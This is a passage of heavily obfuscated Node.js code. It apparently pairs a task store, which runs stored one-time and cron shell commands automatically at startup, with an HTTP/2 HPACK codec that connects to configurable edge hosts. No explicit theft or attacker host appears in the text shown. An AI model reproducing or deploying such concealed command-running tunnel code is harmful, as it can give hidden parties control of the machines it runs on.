            'status': 'ok',
            'count': b[eU(0xcfc)],
            'logs': b
        };
    }
    static [a0c4(0xbfc)](a = 0x32) {
        const eV = a0c4, b = a0P['crontasks_log']['slice'](-a);
        return {
            'status': 'ok',
            'count': b[eV(0xcfc)],
            'logs': b
        };
    }
    static [a0c4(0xd9e)]() {
        const eW = a0c4, a = { 'DBsGo': eW(0xc09) }, b = a0P['onetimetasks_log'][eW(0xcfc)];
        return a0P['onetimetasks_log'] = [], {
            'status': 'ok',
            'cleared': a['DBsGo']
        };
    }
    static [a0c4(0xa26)]() {
        const eX = a0c4, a = a0P[eX(0x30f)][eX(0xcfc)];
        return a0P[eX(0x30f)] = [], {
            'status': 'ok',
            'cleared': 'cron'
        };
    }
    static [a0c4(0xbde)]() {
        const eY = a0c4, a = {
                'oEnWk': function (g, h) {
                    return g - h;
                },
                'VCdze': function (g, h) {
                    return g - h;
                }
            }, b = a0P['onetimetasks_log'][eY(0xaf5)](g => g[eY(0x3de)] === 0x0)[eY(0xcfc)], c = a['oEnWk'](a0P[eY(0x26b)][eY(0xcfc)], b), d = a0P[eY(0x30f)]['filter'](g => g[eY(0x3de)] === 0x0)[eY(0xcfc)], f = a['VCdze'](a0P[eY(0x30f)]['length'], d);
        return {
            'onetime': {
                'total_logged': a0P['onetimetasks_log']['length'],
                'max_capacity': a0P['MAX_TASK_LOG_SIZE'],
                'recent_success': b,
                'recent_failed': c
            },
            'cron': {
                'total_logged': a0P['crontasks_log'][eY(0xcfc)],
                'max_capacity': a0P['MAX_TASK_LOG_SIZE'],
                'recent_success': d,
                'recent_failed': f
            }
        };
    }
    static async [a0c4(0x60b)]() {
        const eZ = a0c4, a = { 'nvvlP': eZ(0xc09) }, b = [];
        for (let c = 0x0; c < a0P['onetasks']['length']; c++) {
            const d = a0P[eZ(0xc34)][c], f = await a0a1[eZ(0x5ea)](d), g = this[eZ(0x63e)](d, f['result'], f[eZ(0x3de)], a[eZ(0x4bd)]);
            this[eZ(0xb75)](a0P[eZ(0x26b)], g), b['push']({
                'cmd': d,
                'exitcode': f[eZ(0x3de)],
                'output': f[eZ(0xa5f)],
                'timeout': f['timeout']
            });
        }
        return a0P[eZ(0x239)] = ![], {
            'status': 'ok',
            'executed': b[eZ(0xcfc)],
            'results': b
        };
    }
    static [a0c4(0x69b)]() {
        const f0 = a0c4, a = {
                'rBava': function (c, d) {
                    return c > d;
                },
                'iwtLt': function (c, d) {
                    return c > d;
                }
            };
        a0a5[f0(0xd98)]();
        const b = a0a5[f0(0x74c)]();
        a[f0(0x8bf)](b[f0(0xc34)][f0(0xcfc)], 0x0) && (a0P[f0(0xc34)] = b[f0(0xc34)]);
        if (a['iwtLt'](Object[f0(0xa7e)](b[f0(0xbbc)])[f0(0xcfc)], 0x0))
            try {
                a0a6['setCronTasks'](b[f0(0xbbc)]);
            } catch (c) {
                a0D[f0(0xbb0)]('[TaskStore]\x20❌\x20定时任务恢复异常\x20(不影响服务):\x20' + c[f0(0x1f1)]);
            }
        a[f0(0x228)](a0P[f0(0xc34)][f0(0xcfc)], 0x0) && a0P[f0(0x239)] && a0a6[f0(0x60b)]()[f0(0x22d)](d => a0D[f0(0xbb0)]('[TaskStore]\x20❌\x20启动任务恢复执行异常\x20(不影响服务):\x20' + d['message']));
    }
}
const a0a7 = a0c4(0x2d0), a0a8 = ((() => {
        const f1 = a0c4, a = {
                'vwIus': function (c, d) {
                    return c(d);
                },
                'VhXpR': function (c, d) {
                    return c > d;
                },
                'iolod': f1(0x513),
                'QqefG': f1(0x8cc)
            }, b = a[f1(0xc21)](String, process.env.KISAMA_EDGE_HOSTS || '')['split'](',')[f1(0x922)](c => c[f1(0x7e4)]())[f1(0xaf5)](Boolean);
        return a[f1(0xd48)](b[f1(0xcfc)], 0x0) ? b : [
            a['iolod'],
            a[f1(0x6a6)]
        ];
    })()), a0a9 = 0x1ea4, a0aa = a0c4(0x528), a0ab = a0c4(0x223), a0ac = 0x4000, a0ad = [
        [
            ':authority',
            ''
        ],
        [
            ':method',
            a0c4(0x64e)
        ],
        [
            a0c4(0x917),
            a0c4(0x440)
        ],
        [
            a0c4(0x1ab),
            '/'
        ],
        [
            ':path',
            a0c4(0x2c9)
        ],
        [
            ':scheme',
            a0c4(0x378)
        ],
        [
            a0c4(0xb86),
            a0c4(0x603)
        ],
        [
            a0c4(0x85a),
            a0c4(0x813)
        ],
        [
            ':status',
            a0c4(0x3c3)
        ],
        [
            a0c4(0x85a),
            a0c4(0x25c)
        ],
        [
            a0c4(0x85a),
            '304'
        ],
        [
            a0c4(0x85a),
            a0c4(0x3a6)
        ],
        [
            a0c4(0x85a),
            a0c4(0x313)
        ],
        [
            a0c4(0x85a),
            a0c4(0xca8)
        ],
        [
            a0c4(0x4a4),
            ''
        ],
        [
            a0c4(0xa58),
            'gzip,\x20deflate'
        ],
        [
            'accept-language',
            ''
        ],
        [
            a0c4(0x2f1),
            ''
        ],
        [
            a0c4(0x34f),
            ''
        ],
        [
            a0c4(0x208),
            ''
        ],
        [
            a0c4(0xd06),
            ''
        ],
        [
            'allow',
            ''
        ],
        [
            a0c4(0xa4e),
            ''
        ],
        [
            'cache-control',
            ''
        ],
        [
            a0c4(0x411),
            ''
        ],
        [
            a0c4(0x3e5),
            ''
        ],
        [
            a0c4(0x671),
            ''
        ],
        [
            a0c4(0x985),
            ''
        ],
        [
            a0c4(0xd50),
            ''
        ],
        [
            a0c4(0x8af),
            ''
        ],
        [
            a0c4(0xa4b),
            ''
        ],
        [
            a0c4(0xa24),
            ''
        ],
        [
            a0c4(0x1e2),
            ''
        ],
        [
            a0c4(0xb06),
            ''
        ],
        [
            a0c4(0xd4f),
            ''
        ],
        [
            a0c4(0xd31),
            ''
        ],
        [
            a0c4(0x581),
            ''
        ],
        [
            a0c4(0x920),
            ''
        ],
        [
            'if-match',
            ''
        ],
        [
            a0c4(0x23c),
            ''
        ],
        [
            a0c4(0x4c1),
            ''
        ],
        [
            a0c4(0x231),
            ''
        ],
        [
            a0c4(0xda2),
            ''
        ],
        [
            a0c4(0xd97),
            ''
        ],
        [
            a0c4(0x85b),
            ''
        ],
        [
            a0c4(0x712),
            ''
        ],
        [
            'max-forwards',
            ''
        ],
        [
            a0c4(0xb40),
            ''
        ],
        [
            a0c4(0xd84),
            ''
        ],
        [
            'range',
            ''
        ],
        [
            a0c4(0x55e),
            ''
        ],
        [
            'refresh',
            ''
        ],
        [
            a0c4(0x5a3),
            ''
        ],
        [
            a0c4(0x9b2),
            ''
        ],
        [
            a0c4(0x5b4),
            ''
        ],
        [
            a0c4(0x605),
            ''
        ],
        [
            'transfer-encoding',
            ''
        ],
        [
            a0c4(0x71b),
            ''
        ],
        [
            'vary',
            ''
        ],
        [
            a0c4(0x3ef),
            ''
        ],
        [
            'www-authenticate',
            ''
        ]
    ], a0ae = [
        0x1ff8,
        0x7fffd8,
        0xfffffe2,
        0xfffffe3,
        0xfffffe4,
        0xfffffe5,
        0xfffffe6,
        0xfffffe7,
        0xfffffe8,
        0xffffea,
        0x3ffffffc,
        0xfffffe9,
        0xfffffea,
        0x3ffffffd,
        0xfffffeb,
        0xfffffec,
        0xfffffed,
        0xfffffee,
        0xfffffef,
        0xffffff0,
        0xffffff1,
        0xffffff2,
        0x3ffffffe,
        0xffffff3,
        0xffffff4,
        0xffffff5,
        0xffffff6,
        0xffffff7,
        0xffffff8,
        0xffffff9,
        0xffffffa,
        0xffffffb,
        0x14,
        0x3f8,
        0x3f9,
        0xffa,
        0x1ff9,
        0x15,
        0xf8,
        0x7fa,
        0x3fa,
        0x3fb,
        0xf9,
        0x7fb,
        0xfa,
        0x16,
        0x17,
        0x18,
        0x0,
        0x1,
        0x2,
        0x19,
        0x1a,
        0x1b,
        0x1c,
        0x1d,
        0x1e,
        0x1f,
        0x5c,
        0xfb,
        0x7ffc,
        0x20,
        0xffb,
        0x3fc,
        0x1ffa,
        0x21,
        0x5d,
        0x5e,
        0x5f,
        0x60,
        0x61,
        0x62,
        0x63,
        0x64,
        0x65,
        0x66,
        0x67,
        0x68,
        0x69,
        0x6a,
        0x6b,
        0x6c,
        0x6d,
        0x6e,
        0x6f,
        0x70,
        0x71,
        0x72,
        0xfc,
        0x73,
        0xfd,
        0x1ffb,
        0x7fff0,
        0x1ffc,
        0x3ffc,
        0x22,
        0x7ffd,
        0x3,
        0x23,
        0x4,
        0x24,
        0x5,
        0x25,
        0x26,
        0x27,
        0x6,
        0x74,
        0x75,
        0x28,
        0x29,
        0x2a,
        0x7,
        0x2b,
        0x76,
        0x2c,
        0x8,
        0x9,
        0x2d,
        0x77,
        0x78,
        0x79,
        0x7a,
        0x7b,
        0x7ffe,
        0x7fc,
        0x3ffd,
        0x1ffd,
        0xffffffc,
        0xfffe6,
        0x3fffd2,
        0xfffe7,
        0xfffe8,
        0x3fffd3,
        0x3fffd4,
        0x3fffd5,
        0x7fffd9,
        0x3fffd6,
        0x7fffda,
        0x7fffdb,
        0x7fffdc,
        0x7fffdd,
        0x7fffde,
        0xffffeb,
        0x7fffdf,
        0xffffec,
        0xffffed,
        0x3fffd7,
        0x7fffe0,
        0xffffee,
        0x7fffe1,
        0x7fffe2,
        0x7fffe3,
        0x7fffe4,
        0x1fffdc,
        0x3fffd8,
        0x7fffe5,
        0x3fffd9,
        0x7fffe6,
        0x7fffe7,
        0xffffef,
        0x3fffda,
        0x1fffdd,
        0xfffe9,
        0x3fffdb,
        0x3fffdc,
        0x7fffe8,
        0x7fffe9,
        0x1fffde,
        0x7fffea,
        0x3fffdd,
        0x3fffde,
        0xfffff0,
        0x1fffdf,
        0x3fffdf,
        0x7fffeb,
        0x7fffec,
        0x1fffe0,
        0x1fffe1,
        0x3fffe0,
        0x1fffe2,
        0x7fffed,
        0x3fffe1,
        0x7fffee,
        0x7fffef,
        0xfffea,
        0x3fffe2,
        0x3fffe3,
        0x3fffe4,
        0x7ffff0,
        0x3fffe5,
        0x3fffe6,
        0x7ffff1,
        0x3ffffe0,
        0x3ffffe1,
        0xfffeb,
        0x7fff1,
        0x3fffe7,
        0x7ffff2,
        0x3fffe8,
        0x1ffffec,
        0x3ffffe2,
        0x3ffffe3,
        0x3ffffe4,
        0x7ffffde,
        0x7ffffdf,
        0x3ffffe5,
        0xfffff1,
        0x1ffffed,
        0x7fff2,
        0x1fffe3,
        0x3ffffe6,
        0x7ffffe0,
        0x7ffffe1,
        0x3ffffe7,
        0x7ffffe2,
        0xfffff2,
        0x1fffe4,
        0x1fffe5,
        0x3ffffe8,
        0x3ffffe9,
        0xffffffd,
        0x7ffffe3,
        0x7ffffe4,
        0x7ffffe5,
        0xfffec,
        0xfffff3,
        0xfffed,
        0x1fffe6,
        0x3fffe9,
        0x1fffe7,
        0x1fffe8,
        0x7ffff3,
        0x3fffea,
        0x3fffeb,
        0x1ffffee,
        0x1ffffef,
        0xfffff4,
        0xfffff5,
        0x3ffffea,
        0x7ffff4,
        0x3ffffeb,
        0x7ffffe6,
        0x3ffffec,
        0x3ffffed,
        0x7ffffe7,
        0x7ffffe8,
        0x7ffffe9,
        0x7ffffea,
        0x7ffffeb,
        0xffffffe,
        0x7ffffec,
        0x7ffffed,
        0x7ffffee,
        0x7ffffef,
        0x7fffff0,
        0x3ffffee,
        0x3fffffff
    ], a0af = [
        0xd,
        0x17,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x18,
        0x1e,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1e,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x1c,
        0x6,
        0xa,
        0xa,
        0xc,
        0xd,
        0x6,
        0x8,
        0xb,
        0xa,
        0xa,
        0x8,
        0xb,
        0x8,
        0x6,
        0x6,
        0x6,
        0x5,
        0x5,
        0x5,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x6,
        0x7,
        0x8,
        0xf,
        0x6,
        0xc,
        0xa,
        0xd,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0x8,
        0x7,
        0x8,
        0xd,
        0x13,
        0xd,
        0xe,
        0x6,
        0xf,
        0x5,
        0x6,
        0x5,
        0x6,
        0x5,
        0x6,
        0x6,
        0x6,
        0x5,
        0x7,
        0x7,
        0x6,
        0x6,
        0x6,
        0x5,
        0x6,
        0x7,
        0x6,
        0x5,
        0x5,
        0x6,
        0x7,
        0x7,
        0x7,
        0x7,
        0x7,
        0xf,
        0xb,
        0xe,
        0xd,
        0x1c,
        0x14,
        0x16,
        0x14,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x17,
        0x17,
        0x17,
        0x18,
        0x17,
        0x18,
        0x18,
        0x16,
        0x17,
        0x18,
        0x17,
        0x17,
        0x17,
        0x17,
        0x15,
        0x16,
        0x17,
        0x16,
        0x17,
        0x17,
        0x18,
        0x16,
        0x15,
        0x14,
        0x16,
        0x16,
        0x17,
        0x17,
        0x15,
        0x17,
        0x16,
        0x16,
        0x18,
        0x15,
        0x16,
        0x17,
        0x17,
        0x15,
        0x15,
        0x16,
        0x15,
        0x17,
        0x16,
        0x17,
        0x17,
        0x14,
        0x16,
        0x16,
        0x16,
        0x17,
        0x16,
        0x16,
        0x17,
        0x1a,
        0x1a,
        0x14,
        0x13,
        0x16,
        0x17,
        0x16,
        0x19,
        0x1a,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x18,
        0x19,
        0x13,
        0x15,
        0x1a,
        0x1b,
        0x1b,
        0x1a,
        0x1b,
        0x18,
        0x15,
        0x15,
        0x1a,
        0x1a,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x14,
        0x18,
        0x14,
        0x15,
        0x16,
        0x15,
        0x15,
        0x17,
        0x16,
        0x16,
        0x19,
        0x19,
        0x18,
        0x18,
        0x1a,
        0x17,
        0x1a,
        0x1b,
        0x1a,
        0x1a,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1c,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1b,
        0x1a,
        0x1e
    ];
function a0ag() {
    const f2 = a0c4, a = {
            'Uabey': function (c, d) {
                return c < d;
            },
            'yklUS': function (c, d) {
                return c - d;
            },
            'DRzlw': function (c, d) {
                return c >= d;
            },
            'abIZS': function (c, d) {
                return c & d;
            },
            'gzFoW': function (c, d) {
                return c >> d;
            },
            'YHQgL': function (c, d) {
                return c === d;
            },
            'oUiCm': function (c, d) {
                return c + d;
            }
        }, b = [
            null,
            null,
            -0x1,
            0x0
        ];
    for (let c = 0x0; a[f2(0x523)](c, a0ae['length']); c++) {
        const d = a0ae[c], f = a0af[c];
        let g = b;
        for (let h = a[f2(0x735)](f, 0x1); a[f2(0xb2c)](h, 0x0); h--) {
            const i = a['abIZS'](a[f2(0x2e5)](d, h), 0x1);
            a[f2(0x364)](g[i], null) && (g[i] = [
                null,
                null,
                -0x1,
                a['oUiCm'](g[0x3], 0x1)
            ]), g = g[i];
        }
        g[0x2] = c;
    }
    return b;
}
const a0ah = a0ag();
function a0ai(a) {
    const f3 = a0c4, b = {
            'aOdYD': function (h, i) {
                return h >= i;
            },
            'XYDVY': function (h, i) {
                return h & i;
            },
            'EfCQC': function (h, i) {
                return h >> i;
            },
            'SVvcM': function (h, i) {
                return h << i;
            },
            'QkJSG': function (h, i) {
                return h === i;
            },
            'wglaU': f3(0x72e),
            'pfKYn': f3(0xd3b),
            'bxwxk': function (h, i) {
                return h !== i;
            },
            'QbLok': function (h, i) {
                return h << i;
            }
        }, c = [];
    let d = a0ah, f = 0x0, g = 0x0;
    for (const h of a) {
        for (let i = 0x7; b[f3(0x47a)](i, 0x0); i--) {
            const j = b[f3(0x1a5)](b[f3(0xcb5)](h, i), 0x1);
            f = b[f3(0x697)](f, 0x1) | j, g += 0x1, d = d[j];
            if (b[f3(0x9d0)](d, null))
                throw new Error(b[f3(0x389)]);
            if (b[f3(0x47a)](d[0x2], 0x0)) {
                const k = b[f3(0xc5f)][f3(0x3ff)]('|');
                let l = 0x0;
                while (!![]) {
                    switch (k[l++]) {
                    case '0':
                        g = 0x0;
                        continue;
                    case '1':
                        f = 0x0;
                        continue;
                    case '2':
                        if (b[f3(0x9d0)](d[0x2], 0x100))
                            throw new Error(f3(0xa5b));
                        continue;
                    case '3':
                        c[f3(0x21f)](d[0x2]);
                        continue;
                    case '4':
                        d = a0ah;
                        continue;
                    }
                    break;
                }
            }
        }
    }
    if (g > 0x7 || b['bxwxk'](f, b[f3(0x365)](0x1, g) - 0x1))
        throw new Error(f3(0xc01));
    return Buffer['from'](c);
}
function a0aj(a, b, c) {
    const f4 = a0c4, d = {
            'NSoAB': function (j, k) {
                return j >= k;
            },
            'bggVE': f4(0x564),
            'qrCAO': function (j, k) {
                return j - k;
            },
            'etZfz': function (j, k) {
                return j << k;
            },
            'SKSlq': function (j, k) {
                return j < k;
            },
            'wvOka': function (j, k) {
                return j * k;
            },
            'pqodx': function (j, k) {
                return j & k;
            },
            'HSIMK': function (j, k) {
                return j === k;
            },
            'EzzLw': function (j, k) {
                return j & k;
            },
            'wGKFf': 'HPACK\x20integer\x20too\x20large'
        };
    if (d[f4(0x3eb)](b, a['length']))
        throw new Error(d[f4(0xd34)]);
    const f = a[b];
    b += 0x1;
    const g = d[f4(0x3f1)](d[f4(0xbca)](0x1, c), 0x1);
    let h = f & g;
    if (d[f4(0x93d)](h, g))
        return [
            h,
            b
        ];
    let i = 0x0;
    while (!![]) {
        if (b >= a[f4(0xcfc)])
            throw new Error(d[f4(0xd34)]);
        const j = a[b];
        b += 0x1, h += d[f4(0xa48)](d[f4(0x587)](j, 0x7f), Math[f4(0xd01)](0x2, i));
        if (d['HSIMK'](d[f4(0x62b)](j, 0x80), 0x0))
            return [
                h,
                b
            ];
        i += 0x7;
        if (i > 0x1c)
            throw new Error(d[f4(0xc1d)]);
    }
}
function a0ak(a, b) {
    const f5 = a0c4, c = {
            'TnrLM': function (j, k) {
                return j >= k;
            },
            'mRwQa': f5(0x422),
            'PYAlq': function (j, k) {
                return j(k);
            },
            'IpXMZ': function (j, k) {
                return j & k;
            },
            'IQsZe': function (j, k) {
                return j + k;
            },
            'Dwnnt': function (j, k) {
                return j > k;
            },
            'ywomI': f5(0xc40),
            'YNLKk': function (j, k) {
                return j(k);
            }
        };
    if (c[f5(0x297)](b, a['length']))
        throw new Error(c['mRwQa']);
    const d = c[f5(0x724)](Boolean, c[f5(0xc9a)](a[b], 0x80)), [f, g] = a0aj(a, b, 0x7), h = c['IQsZe'](g, f);
    if (c[f5(0x611)](h, a[f5(0xcfc)]))
        throw new Error(c[f5(0xb9c)]);
    const i = a['subarray'](g, h);
    return [
        d ? c[f5(0xa7f)](a0ai, i) : i,
        h
    ];
}
class a0al {
    constructor() {
        const f6 = a0c4;
        this[f6(0xa4f)] = [], this[f6(0x2f6)] = 0x0, this[f6(0x7d6)] = 0x1000;
    }
    ['tableEntry'](a) {
        const f7 = a0c4, b = {
                'nxZbv': function (d, f) {
                    return d <= f;
                },
                'ikwIe': function (d, f) {
                    return d - f;
                },
                'HqmYg': function (d, f) {
                    return d - f;
                },
                'MJvUU': function (d, f) {
                    return d >= f;
                },
                'TPMNY': 'HPACK\x20dynamic\x20index\x20out\x20of\x20range'
            };
        if (a <= 0x0)
            throw new Error(f7(0xcdd));
        if (b[f7(0x6f9)](a, a0ad[f7(0xcfc)]))
            return a0ad[b[f7(0xc8f)](a, 0x1)];
        const c = b[f7(0xc8f)](b[f7(0x233)](a, a0ad[f7(0xcfc)]), 0x1);
        if (c < 0x0 || b['MJvUU'](c, this[f7(0xa4f)][f7(0xcfc)]))
            throw new Error(b['TPMNY']);
        return this['dynamic'][c];
    }
    [a0c4(0xa29)](a, b) {
        const f8 = a0c4, c = {
                'XzoXh': function (f, g) {
                    return f + g;
                },
                'OUHzG': f8(0x1bc),
                'NIkFE': function (f, g) {
                    return f > g;
                },
                'gXwFK': function (f, g) {
                    return f > g;
                },
                'HcozV': function (f, g) {
                    return f + g;
                }
            }, d = c[f8(0x96f)](c['XzoXh'](0x20, Buffer['byteLength'](a, c[f8(0xb2e)])), Buffer['byteLength'](b, f8(0x1bc)));
        if (c[f8(0x487)](d, this['maxSize'])) {
            this[f8(0xa4f)] = [], this['dynamicSize'] = 0x0;
            return;
        }
        while (c['gXwFK'](this[f8(0xa4f)][f8(0xcfc)], 0x0) && c[f8(0x487)](c[f8(0x96f)](this[f8(0x2f6)], d), this[f8(0x7d6)])) {
            const [f, g] = this[f8(0xa4f)]['pop']();
            this[f8(0x2f6)] -= c[f8(0xa6e)](c[f8(0x96f)](0x20, Buffer[f8(0x2a8)](f, c['OUHzG'])), Buffer[f8(0x2a8)](g, f8(0x1bc)));
        }
        this[f8(0xa4f)][f8(0x1b8)]([
            a,
            b
        ]), this[f8(0x2f6)] += d;
    }
    [a0c4(0x421)](a) {
        const f9 = a0c4, b = {
                'NrNTe': function (f, g) {
                    return f & g;
                },
                'GnCZm': function (f, g) {
                    return f & g;
                },
                'BdnBX': function (f, g, h) {
                    return f(g, h);
                },
                'fOAYf': f9(0x1bc),
                'KCrlg': function (f, g, h) {
                    return f(g, h);
                },
                'wLRrM': function (f, g) {
                    return f & g;
                },
                'DNGTU': function (f, g, h, i) {
                    return f(g, h, i);
                },
                'oMdYp': function (f, g) {
                    return f > g;
                },
                'nDiAP': 'HPACK\x20table\x20size\x20exceeds\x20limit',
                'ULVCQ': function (f, g) {
                    return f + g;
                }
            }, c = [];
        let d = 0x0;
        while (d < a[f9(0xcfc)]) {
            const f = a[d];
            if (b[f9(0xa2a)](f, 0x80)) {
                let j;
                [j, d] = a0aj(a, d, 0x7), c[f9(0x21f)](this[f9(0x1c4)](j));
                continue;
            }
            if (b[f9(0xd20)](f, 0x40)) {
                let k, l;
                [k, d] = a0aj(a, d, 0x6);
                if (k)
                    l = this[f9(0x1c4)](k)[0x0];
                else {
                    let o;
                    [o, d] = b['BdnBX'](a0ak, a, d), l = o[f9(0xa3c)](b[f9(0x863)])[f9(0xc48)]();
                }
                let m;
                [m, d] = b[f9(0x44e)](a0ak, a, d);
                const n = m[f9(0xa3c)](b[f9(0x863)]);
                this[f9(0xa29)](l, n), c[f9(0x21f)]([
                    l,
                    n
                ]);
                continue;
            }
            if (b['wLRrM'](f, 0x20)) {
                let p;
                [p, d] = b[f9(0x1ee)](a0aj, a, d, 0x5);
                if (b[f9(0x78f)](p, 0x1000))
                    throw new Error(b[f9(0xb6c)]);
                this[f9(0x7d6)] = p;
                while (b[f9(0x78f)](this[f9(0xa4f)][f9(0xcfc)], 0x0) && b[f9(0x78f)](this['dynamicSize'], p)) {
                    const [q, r] = this[f9(0xa4f)][f9(0x458)]();
                    this[f9(0x2f6)] -= b['ULVCQ'](b[f9(0xa63)](0x20, Buffer[f9(0x2a8)](q, f9(0x1bc))), Buffer[f9(0x2a8)](r, b[f9(0x863)]));
                }
                continue;
            }
            let g, h;
            [g, d] = b['DNGTU'](a0aj, a, d, 0x4);
            if (g)
                h = this[f9(0x1c4)](g)[0x0];
            else {
                let s;
                [s, d] = a0ak(a, d), h = s['toString'](f9(0x1bc))['toLowerCase']();
            }
            let i;
            [i, d] = b['BdnBX'](a0ak, a, d), c['push']([
                h,
                i[f9(0xa3c)](b['fOAYf'])
            ]);
        }
        return c;
    }
}
function a0am(a, b, c) {
    const fa = a0c4, d = {
            'GCGuJ': function (h, i) {
                return h - i;
            },
            'NQoUF': function (h, i) {
                return h << i;
            },
            'BQjtS': function (h, i) {
                return h < i;
            },
            'ZBCKw': function (h, i) {
                return h | i;
            },
            'TrOVx': function (h, i) {
                return h | i;
            },
            'CUUBl': function (h, i) {
                return h & i;
            }
        }, f = d[fa(0xae9)](d['NQoUF'](0x1, b), 0x1);
    if (d['BQjtS'](a, f))
        return Buffer[fa(0x581)]([c | a]);
    const g = [d['ZBCKw'](c, f)];
    a -= f;
    while (a >= 0x80) {
        g[fa(0x21f)](d[fa(0xd6a)](d[fa(0xb12)](a, 0x7f), 0x80)), a = Math[fa(0x5c2)](a / 0x80);
    }
    return g['push'](a), Buffer[fa(0x581)](g);
}
function a0an(a) {
    const fb = a0c4, b = { 'oFfHl': fb(0x1bc) }, c = Buffer[fb(0x581)](a, b[fb(0xd2e)]);
    return Buffer['concat']([
        a0am(c['length'], 0x7, 0x0),
        c
    ]);
}
function a0ao(a) {
    const fc = a0c4, b = {
            'dpbDF': function (d, f) {
                return d === f;
            },
            'FMrVn': fc(0x85a),
            'krtqS': function (d, f) {
                return d === f;
            },
            'IENzY': fc(0x813),
            'yOQsY': function (d, f) {
                return d === f;
            },
            'TQNvL': fc(0x3c3),
            'sLCZZ': fc(0x25c),
            'MtUiX': fc(0x878),
            'bKAtt': fc(0x3a6),
            'tjIJf': function (d, f, g, h) {
                return d(f, g, h);
            },
            'oVBbr': function (d, f) {
                return d(f);
            }
        }, c = [];
    for (const [d, f] of a) {
        if (b[fc(0x282)](d, b[fc(0x2fd)]) && b[fc(0xa1f)](f, b[fc(0x9ef)]))
            c[fc(0x21f)](0x88);
        else {
            if (b['yOQsY'](d, b[fc(0x2fd)]) && f === b[fc(0xc47)])
                c[fc(0x21f)](0x89);
            else {
                if (b[fc(0xa1f)](d, b['FMrVn']) && b[fc(0x4d2)](f, b[fc(0x80f)]))
                    c[fc(0x21f)](0x8a);
                else {
                    if (b['dpbDF'](d, ':status') && b[fc(0xa1f)](f, b[fc(0x4cd)]))
                        c[fc(0x21f)](0x8b);
                    else {
                        if (d === b[fc(0x2fd)] && f === b[fc(0x319)])
                            c[fc(0x21f)](0x8c);
                        else {
                            if (b[fc(0xa1f)](d, b[fc(0x2fd)]) && b[fc(0xa1f)](f, fc(0x313)))
                                c[fc(0x21f)](0x8d);
                            else
                                b[fc(0x4d2)](d, fc(0x85a)) && b['yOQsY'](f, '500') ? c[fc(0x21f)](0x8e) : (c['push'](...b[fc(0x850)](a0am, 0x0, 0x4, 0x0)), c['push'](...a0an(d)), c['push'](...b[fc(0xa04)](a0an, f)));
                        }
                    }
                }
            }
        }
    }
    return Buffer[fc(0x581)](c);
}
class a0ap {
    constructor() {
        this['words'] = [];
    }
    [a0c4(0x9b5)](a) {
        const fd = a0c4, b = {
                'sBMyd': function (d, f) {
                    return d < f;
                }
            }, c = this[fd(0x7f6)][fd(0xcfc)];
        for (let d = 0x0; b[fd(0xa91)](d, a); d++) {
            this[fd(0x7f6)]['push'](0x0n);
        }
        return c;
    }
    [a0c4(0xad5)](a, b, c, d) {
        const fe = a0c4, f = {
                'yQMzG': function (j, k) {
                    return j - k;
                },
                'zfDOG': function (j, k) {
                    return j & k;
                },
                'JybJq': function (j, k) {
                    return j << k;
                },
                'drfQl': function (j, k) {
                    return j(k);
                },
                'WiZeV': function (j, k) {
                    return j | k;
                },
                'kdSEQ': function (j, k) {
                    return j & k;
                },
                'dIdmh': function (j, k) {
                    return j & k;
                }
            }, g = f[fe(0x8de)](b, a) - 0x1, h = f[fe(0xcec)](f[fe(0x663)](f[fe(0x799)](BigInt, g), 0x2n), 0xfffffffcn), i = f[fe(0x31a)](BigInt(f[fe(0x3b0)](c, 0xffff)), f[fe(0x663)](BigInt(f[fe(0xa74)](d, 0xffff)), 0x10n));
        this[fe(0x7f6)][a] = f[fe(0x31a)](h, f[fe(0x663)](i, 0x20n));
    }
    [a0c4(0x7ef)](a, b, c) {
        const ff = a0c4, d = {
                'cTVQk': function (g, h) {
                    return g << h;
                },
                'EJxiA': function (g, h) {
                    return g | h;
                },
                'eJlJS': function (g, h) {
                    return g << h;
                },
                'MBwSr': function (g, h) {
                    return g(h);
                },
                'xYESy': function (g, h) {
                    return g * h;
                }
            }, f = d['cTVQk'](0xffn, BigInt(b * 0x8));
        this[ff(0x7f6)][a] = d[ff(0x8dd)](this[ff(0x7f6)][a] & ~f, d[ff(0x424)](d[ff(0x8a1)](BigInt, c & 0xff), d['MBwSr'](BigInt, d[ff(0xa79)](b, 0x8))));
    }
    [a0c4(0x4e0)](a, b, c) {
        const fg = a0c4, d = {
                'ckQZL': function (g, h) {
                    return g << h;
                },
                'NqNDA': function (g, h) {
                    return g * h;
                },
                'GIIkR': function (g, h) {
                    return g | h;
                },
                'GZVEK': function (g, h) {
                    return g & h;
                },
                'efOkr': function (g, h) {
                    return g & h;
                },
                'BYnbD': function (g, h) {
                    return g(h);
                },
                'BDSaV': function (g, h) {
                    return g * h;
                }
            }, f = d[fg(0xa2b)](0xffffn, BigInt(d[fg(0x830)](b, 0x8)));
        this['words'][a] = d[fg(0x387)](d[fg(0xa68)](this[fg(0x7f6)][a], ~f), d['ckQZL'](BigInt(d[fg(0xaec)](c, 0xffff)), d[fg(0x457)](BigInt, d['BDSaV'](b, 0x8))));
    }
    [a0c4(0x470)](a, b, c) {
        const fh = a0c4, d = {
                'kNEQb': function (g, h) {
                    return g << h;
                },
                'WifXT': function (g, h) {
                    return g(h);
                },
                'EaPQV': function (g, h) {
                    return g * h;
                },
                'QanAy': function (g, h) {
                    return g & h;
                },
                'PDVJo': function (g, h) {
                    return g << h;
                },
                'kjDSE': function (g, h) {
                    return g(h);
                },
                'GZkEZ': function (g, h) {
                    return g & h;
                },
                'KHIRv': function (g, h) {
                    return g * h;
                }
